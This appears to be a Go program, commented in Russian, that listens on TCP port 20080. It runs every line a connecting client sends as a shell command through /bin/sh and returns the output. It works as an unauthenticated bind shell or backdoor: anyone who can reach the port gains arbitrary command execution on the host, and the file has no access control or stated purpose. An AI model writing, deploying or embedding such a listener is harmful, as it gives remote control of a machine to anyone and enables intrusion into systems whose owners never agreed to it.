package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io"
	"log"
	"net"
	"os/exec"
)

func handleConnection(conn net.Conn) {
	defer conn.Close()
	fmt.Printf("Новое подключение от %s\n", conn.RemoteAddr())

	reader := bufio.NewReader(conn)

	for {
		// Читаем команду от клиента
		command, err := reader.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				fmt.Printf("Клиент %s отключился\n", conn.RemoteAddr())
				return
			}
			log.Printf("Ошибка чтения команды: %v\n", err)
			return
		}

		command = command[:len(command)-1] // Удаляем символ новой строки

		// Если команда "exit", завершаем соединение
		if command == "exit" {
			fmt.Printf("Клиент %s завершил соединение\n", conn.RemoteAddr())
			return
		}

		// Выполняем команду
		cmd := exec.Command("/bin/sh", "-c", command)
		var output bytes.Buffer
		cmd.Stdout = &output
		cmd.Stderr = &output

		err = cmd.Run()
		if err != nil {
			output.WriteString(fmt.Sprintf("\nОшибка выполнения команды: %v", err))
		}

		// Отправляем результат обратно клиенту
		_, err = conn.Write(output.Bytes())
		if err != nil {
			log.Printf("Ошибка отправки данных клиенту: %v\n", err)
			return
		}
	}
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalf("Не удалось запустить сервер: %v\n", err)
	}
	defer listener.Close()

	fmt.Println("Сервер слушает на порту 20080...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Ошибка подключения клиента: %v\n", err)
			continue
		}
		go handleConnection(conn) // Обрабатываем каждое подключение в отдельной горутине
	}
}
